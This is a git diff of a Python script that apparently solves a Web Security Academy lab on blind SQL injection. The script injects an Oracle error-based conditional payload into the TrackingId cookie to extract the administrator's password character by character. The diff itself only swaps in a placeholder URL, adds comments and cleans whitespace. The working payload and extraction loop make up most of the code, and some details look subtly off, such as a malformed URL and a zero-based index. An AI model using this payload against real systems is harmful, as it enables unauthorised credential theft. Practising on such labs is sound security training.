@@ -1,6 +1,6 @@
 import requests
 
-url = 'https://0a59008b038c7f1c806e9ed300350053.web-security-academy.net/'
+url = 'https:/xxx.web-security-academy.net/' #Replace here the url.
 
 
 class Injection:
@@ -14,7 +14,7 @@ class Injection:
         self.session.get(self.url)
         return self.session.cookies.get('TrackingId')
 
-    
+
     def getLen(self): #Return length from the admin pass
 
         for length in range(40):
@@ -33,12 +33,12 @@ class Injection:
         length = self.getLen()
 
         passwd = ''
-        
+
         print('Password : ', end='')
 
         for index in range(length):
             for char in chars:
-                sqlPayload = f"' AND (SELECT CASE WHEN (SUBSTR(password, {index}, 1)='{char}') THEN TO_CHAR(1/0) ELSE 'a' END FROM users WHERE username='administrator')='a--"
+                sqlPayload = f"' AND (SELECT CASE WHEN (SUBSTR(password, {index}, 1)='{char}') THEN TO_CHAR(1/0) ELSE 'a' END FROM users WHERE username='administrator')='a--" #Sql injection.
                 cookies = {'TrackingId' : self.cookieId + sqlPayload}
 
                 page = bool(self.session.get(self.url, cookies=cookies).ok)
@@ -49,7 +49,7 @@ class Injection:
                     break
 
             return '\n End !'
-  
+
 
 def main():
     sqlInjection = Injection(url)
